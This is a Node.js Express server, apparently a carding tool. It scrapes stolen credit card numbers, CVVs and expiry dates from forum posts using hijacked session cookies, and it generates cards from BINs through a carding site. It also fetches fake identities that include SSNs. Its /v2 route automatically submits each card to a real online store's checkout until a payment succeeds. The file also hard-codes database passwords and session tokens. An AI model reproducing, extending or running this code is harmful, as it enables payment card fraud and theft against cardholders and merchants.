var express = require("express");
var bodyParser = require("body-parser");
var request = require("request");
var cheerio = require("cheerio");
var TempMail = require('tempmail.js');
var token = require("token");
var url = require("./url");
var cookie = null;
var cookieLog = null;
var userAgent = null;
var domains = [ '@leeching.net', '@extremail.ru', '@kismail.ru' ];
var app = express();

var mysql = require('promise-mysql');
var conn;

// email: database@leeching.net
mysql.createConnection({
    host: 'db4free.net',
    user: 'altenen',
    password: 'altenen',
    database: 'altenen'
}).then(function(connection){
    console.log("Conexion correcta con la base de datos");
    conn = connection;
});

token.defaults.secret = 'altenen';

var selector = ".unread";

var mail = new TempMail("database" + domains[ 0 ]);
var mail = new TempMail("orlicito" + domains[ 0 ]);
// var mail = new TempMail();

console.log( mail );

app.set("port", 5000); //agregar el puerto

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ "extended": false }));

app.use(express.static(__dirname + "/public"));

app.listen(app.get("port"), function() { //Conexion con la base de datos
    console.log('Servidor iniciado en http://localhost:' + app.get("port"));
});

var options = {
    uri: url,
    headers: {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0",
        "Cookie": "sucuri_cloudproxy_uuid_20359d16b=b8673a4e36c7a54b32f2f81d61a7c9cc; bbsessionhash=8686e8908c9d423ec7d045ea555febf3; bblastvisit=1464302351; bblastactivity=0; bbuserid=491127; bbpassword=92224eb45fd2803c69b28ad0158303b0; sucuric_prtmpcb=1"
    }
};

app.get("/atn", function (req, res) {
    console.log("Peticion de /");

    request(options,
        function (error, response, body) {
            if (!error && response.statusCode == 200) {
                res.send(body)
                console.log(response.cookie);
            }
            else {
                console.log("error");
                console.log(error);
                res.send(error);
            }
        }
    );

});

app.get("/post", function (req, res) {
    console.log("Peticion de /post");

    request(options,
        function (error, response, body) {
            if (!error && response.statusCode == 200) {
                // res.send(body)

                // Esto es lo que genera el json_callback([])
                $ = cheerio.load(body); // Show the HTML for the Google homepage.
                // --

                var td = $(selector);
                // console.log(td)
                var title = "";
                var cards = [];

                for( var i = 0; i < td.length; i ++ ) {
                    var json = {};
                    json.title = title = td[i].attribs.title;

                    json.card = /[\d]{16}/.exec(title);

                    if( json.card ) {
                        json.card = json.card[0];
                        title = title.replace(json.card, "");
                    }

                    json.year = /20[1-2]\d/.exec(title);

                    if( json.year != null ) {
                        json.year = json.year[0];
                        title = title.replace(json.year, "");
                        json.year = json.year.replace("20", "");
                    }

                    json.cvv = /[\d]{3}/.exec(title);

                    if( json.cvv != null ) {
                        json.cvv = json.cvv[0];
                        title = title.replace(json.cvv, "");
                    }

                    json.mon = /[\d]{2}/.exec(title);

                    if( json.mon != null ) {
                        json.mon = json.mon[0];
                        title = title.replace(json.mon, "");
                    }

                    if( !json.year ) {
                        json.year = /[\d]{2}/.exec(title);

                        if( json.year != null ) {
                            json.year = json.year[0];
                            title = title.replace(json.year, "");
                        }
                    }

                    json.mon = json.mon;
                    json.year = json.year;

                    if( json.mon <= 0 || json.mon > 12 ) {
                        json.mon = null;
                    }

                    if( json.card && json.cvv && json.year && json.mon && i > -1)
                        cards.push(json);

                }

                // --

                // console.log(body);

                // res.send(body);

                // if( req.query.callback )
                //     res.send(req.query.callback + "(" + JSON.stringify(cards) + ")");
                // else
                //     res.send(cards);

            }
            else {
                console.log("error");
                console.log(error);
            }
        }
    );

});

// http://localhost:5000/bin?bin=45000305xxxxxx&mon=0&year=16&cvv=0&can=1

app.get("/bin", function(req, res) {
    console.log("Peticion de /bin");

    var cantidad = req.query.can > -1 ? req.query.can : 1;
    var formato = 1;    // 1 CHECKER | 2 XML
    var separador = 1;  // 1 |         2  -  | 3 " "
    var tipoBanc = 0;   // 0 no mostrar        1 mostrar
    var fechaRand = 1;
    var cvvRand = 1;
    var bin = req.query.bin;

    request.post({
            url:'http://darksidecc.com/dummy.php',
            form: {
                hmch:cantidad,
                fmt:formato,
                sp:separador,
                cdt:"",
                tp:tipoBanc,
                dt:fechaRand,
                dtr:fechaRand,
                cvi:cvvRand,
                cvr:cvvRand,
                cvd:"",
                mb:bin
            }
        }, 
        function(error, response, body){
            if (!error && response.statusCode == 200) {
                var arr = [];

                var lines = body.split("\n");

                lines.pop();

                for( var i = 0; i < lines.length; i++ ) {
                    var line = lines[i].split("|");
                    var json = {
                        "card": line[0],
                        "mon": req.query.mon > 0 && req.query.mon < 13 ? req.query.mon : line[1],
                        "year": req.query.year > 15 ? req.query.year : line[2].replace("20", ""),
                        "cvv": req.query.cvv > 0 ? req.query.cvv : line[3]
                    };
                    arr.push(json);

                }

                if( req.query.callback )
                    res.send(req.query.callback + "(" + JSON.stringify(arr) + ")");
                else
                    res.send(arr);

                console.log(arr);
            }
            else {
                res.send(error);
            } 
        }
    )  

})

app.get("/info", function(req, res) {
    console.log("Peticion de /info");

    var bin = req.query.bin;

    var binFormat = "";

    for( var i = 0; i < 6; i++ ) {
        var num = bin[i];
        binFormat += num ? num : "0";
    }

    request.post({
            url:'http://darksidecc.com/dummy.php',
            form: {
                bnvl:binFormat
            }
        }, 
        function(error, response, body){
            if (!error && response.statusCode == 200) {
                var arr = [];

                var td = body.replace(' width="475"', '').replace("</div>", "").match(/[^<td>]+(?=<\/td>)/g);

                var json = {
                    bin: td[1].trim(),
                    ctry: td[11].trim(),
                    ctry2: td[13].trim(),
                    ctry3: td[15].trim(),
                    nivel: td[9].trim(),
                    card: td[7].trim(),
                    type: td[5].trim(),
                    bank: td[3].trim()
                }

                console.log(json);

                if( req.query.callback )
                    res.send(req.query.callback + "(" + JSON.stringify(json) + ")");
                else
                    res.send(json);

            }
            else {
                res.send(error);
            } 
        }
    )  

})

app.get("/mail", function(req, res) {

    var txt = "<h1>" + mail.address + "</h1></br>"; 

    var del = req.query.del;

    if( del ) 
        mail.deleteMessage(del).then(function(deletedMessage) {
          console.log(deletedMessage);
        });

    mail.getMail().then(function(msg) {
        console.log("Verificando correo")
        console.log(msg);
        txt += JSON.stringify(msg);
        res.send(txt);
    })

})

app.get("/fake", function(req, res) {
    // http://www.fakeaddressgenerator.com/World_Address/get_us_address

    var sex = req.query.sex;
    var state = req.query.state;
    var city = req.query.city;
    var zip = req.query.zip;
    var ip = req.query.ip;

    request.post({
            url:'http://www.fakeaddressgenerator.com/World_Address/get_us_address',
            form: {
                sex: sex,
                state: state,
                city: city,
                zip: zip,
                ip: ip
            }
        }, 
        function(error, response, body){
            if (!error && response.statusCode == 200) {
                
                var $ = cheerio.load(body);

                var inputs = $(".no-style");

                var fullname = inputs[0].attribs.value;

                var expires = inputs[13].attribs.value.split("/");

                var mon = expires[0];

                if( mon < 10 )
                    mon = "0" + mon;

                var year = expires[1].replace("20", "");

                var fake = {
                    "fullname": fullname,
                    "firstname": fullname.split(" ")[0],
                    "lastname": fullname.split(" ")[2],
                    "gender": inputs[1].attribs.value,
                    "title": inputs[2].attribs.value,
                    "birthday": inputs[3].attribs.value,
                    "ssn": inputs[4].attribs.value,
                    "street": inputs[5].attribs.value,
                    "city": inputs[6].attribs.value,
                    "state": inputs[7].attribs.value,
                    "zip": inputs[8].attribs.value,
                    "phone": inputs[9].attribs.value,
                    "cardType": inputs[10].attribs.value,
                    "card": inputs[11].attribs.value,
                    "cvv": inputs[12].attribs.value,
                    "mon": mon,
                    "year": year,
                    "company": inputs[14].attribs.value,
                    "ocuppation": inputs[15].attribs.value,
                    "username": inputs[16].attribs.value,
                    "password": inputs[17].attribs.value,
                    "height": inputs[18].attribs.value,
                    "weight": inputs[19].attribs.value,
                }

                if( req.query.callback )
                    res.send(req.query.callback + "(" + JSON.stringify(fake) + ")");
                else
                    res.send(fake);

            }
            else {
                res.send(error);
            } 
        }
    )

})

app.get("/v2", function(req, res) {
    console.log("peticion /v2")

    var ccCount = 0;

    var getCC = function() {

        request(options,
            function (error, response, body) {
                if (!error && response.statusCode == 200) {
                    console.log("\nPedimos nueva tanda de cc's\n");

                    // Esto es lo que genera el json_callback([])
                    $ = cheerio.load(body); // Show the HTML for the Google homepage.
                    // --

                    var td = $(selector);
                    var title = "";
                    var cards = [];

                    for( var i = 0; i < td.length; i ++ ) {
                        var json = {};
                        title = td[i].attribs.title;

                        json.card = /[\d]{16}/.exec(title);

                        if( json.card ) {
                            json.card = json.card[0];
                            title = title.replace(json.card, "");
                        }

                        json.year = /20[1-2]\d/.exec(title);

                        if( json.year != null ) {
                            json.year = json.year[0];
                            title = title.replace(json.year, "");
                            json.year = json.year.replace("20", "");
                        }

                        json.cvv = /[\d]{3}/.exec(title);

                        if( json.cvv != null ) {
                            json.cvv = json.cvv[0];
                            title = title.replace(json.cvv, "");
                        }

                        json.mon = /[\d]{2}/.exec(title);

                        if( json.mon != null ) {
                            json.mon = json.mon[0];
                            title = title.replace(json.mon, "");
                        }

                        if( !json.year ) {
                            json.year = /[\d]{2}/.exec(title);

                            if( json.year != null ) {
                                json.year = json.year[0];
                                title = title.replace(json.year, "");
                            }
                        }

                        json.mon = Number(json.mon);
                        json.year = Number(json.year);

                        if( json.mon <= 0 || json.mon > 12 ) {
                            json.mon = null;
                        }

                        if( json.year < 16 || json.year > 26 ) {
                            json.year = null;
                        }


                        if( json.card && json.cvv && json.year && json.mon && i > -1)
                            cards.push(json);
                    }

                    callback(cards);
                }
                else {
                    console.log("error");
                    console.log(error);
                }
            }
        );

    }

    getCC();

    var callback = function(arr) {
        var i = 0;
        var len = arr.length;

        iteration = function() {
            if( i < len ) {
                var json = arr[ i++ ];

                request.post({
                    "url": "https://www.v2.com/checkout.php?action=process_payment",
                    "gzip": true,
                    "form": {
                        "sel_shipping_address": 790044,
                        "shipFirstName": "",
                        "shipLastName": "",
                        "shipCountry": "United States",
                        "shipAddress1": "",
                        "shipAddress2": "",
                        "shipCity": "",
                        "shipState": "Select State",
                        "shipZip": "",
                        "shipPhone": "",
                        "shipEmail": "jaxsoamail0@gmail.com",
                        "selectedShippingMethod[57406f71bc8d6]": "0",
                        "firstname": "",
                        "lastname": "",
                        "addr": "",
                        "city": "",
                        "state": "",
                        "zip": "",
                        "customerid": "",
                        "csip": "23.105.33.218",
                        "ageVerification_month": "",
                        "ageVerification_day": "",
                        "ageVerification_year": "",
                        "couponCode": "",
                        "pointsToRedeem": "",
                        "RocketGate_ccno": json.card,
                        "RocketGate_ccexpm": json.mon,
                        "RocketGate_ccexpy": json.year,
                        "RocketGate_cccode": json.cvv,
                        "RocketGate_firstname": "Brian",
                        "RocketGate_lastname": "Naylor",
                        "RocketGate_zipcode": "32701",
                        "password": "",
                        "confirm_pass": "",
                        "newsletter_signup": ""
                    },
                    "headers": {
                        "Host": "www.v2.com",
                        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0",
                        "Accept": "application/json, text/javascript, */*; q=0.01",
                        "Accept-Language": "es,en-US;q=0.7,en;q=0.3",
                        "Accept-Encoding": "gzip, deflate, br",
                        "DNT": "1",
                        "X-NewRelic-ID": "VQYDWVZbGwIIUlBbBwEC", // Se mantiene
                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                        "X-Requested-With": "XMLHttpRequest",
                        "Referer": "https://www.v2.com/checkout.php",
                        "Content-Length": "631",
                        "Cookie": "SHOP_SESSION_TOKEN=gu3cakp2uk43c3r1k54u2hdjn1; optimizelySegments=%7B%222371251181%22%3A%22ff%22%2C%222373150962%22%3A%22direct%22%2C%222383420557%22%3A%22false%22%7D; optimizelyEndUserId=oeu1463837975168r0.6788868798175948; optimizelyBuckets=%7B%7D; STORE_VISITOR=1; whoson=929-1463837982717; _ga=GA1.2.135272641.1463837984; yieldify_st=1; yieldify_unique=1; yieldify_stc=1; yieldify_ujt=10342; yieldify_visit=1; yieldify_iv=1; RECENTLY_VIEWED_PRODUCTS=2480%2C2160; yieldify_dynamic_campaign=%7B%22v2pro-vaporizer/series-3-dry-herb-cartridge%22%3A%5B4%2C%22https%3A//www.v2.com/product_images/m/166/v2-pro-series-3-loose-leaf-vaporizer-cartridge__35821_thumb.jpg%22%5D%2C%22eliquids/12-flavor-eliquid-sampler-10ml%22%3A%5B2%2C%22https%3A//www.v2.com/product_images/b/760/V2_Electronic_Cigarettes_12-Flavor_E-Liquid_Sampler__23446_thumb.jpg%22%5D%7Dyie; yieldify_fb=USD65.78; V4F_MAX=false; yieldify_delay=1; yieldify_frequency_75943=1; SHOP_ORDER_TOKEN=6a3897796e6896f6d1663e990b9161c8; TID=4444552; yieldify_sale_ts=1463840640151; G_ENABLED_IDPS=google; __insp_wid=841496165; __insp_slim=1463844449904; __insp_nv=true; __insp_ref=aHR0cHM6Ly93d3cudjIuY29tL2NoZWNrb3V0LnBocA%3D%3D; __insp_targlpu=https%3A%2F%2Fwww.v2.com%2Ffinishorder.php; __insp_targlpt=Thanks%20for%20your%20order!; __insp_pad=1; __insp_sid=3231498371; __insp_uid=2949611214; yieldify_location=%257B%2522country%2522%253A%2522United%2520States%2522%252C%2522region%2522%253A%2522Texas%2522%252C%2522city%2522%253A%2522Dallas%2522%257D; _gat_UA-16173922-1=1; v2_rt=1471964; yieldify_basket=57.95; SHOP_TOKEN=9719457150e524c7539.10094694; userId=9719457150e524c7539.10094694; LOGIN_STATUS=logged",
                        "Connection": "keep-alive"
                    }
                },
                function(error, response, body){
                    if (!error && response.statusCode == 200) {

                        console.log("\nPeticion #" + ccCount++);
                        console.log(body);

                        var v2Json = JSON.parse( body );

                        console.log(v2Json);

                        if( v2Json.error ){
                            console.log("No paso, probemos otra");
                            iteration();
                        }
                        else {
                            console.log("La cc paso");
                            console.log(json.title);
                        }

                    }
                    else {
                        console.log("error");
                        console.log(error);
                        res.send("<script>window.location.reload()</script>");
                    }
                })
            }
            else {
                getCC();
            }
        };

        iteration();

    }
})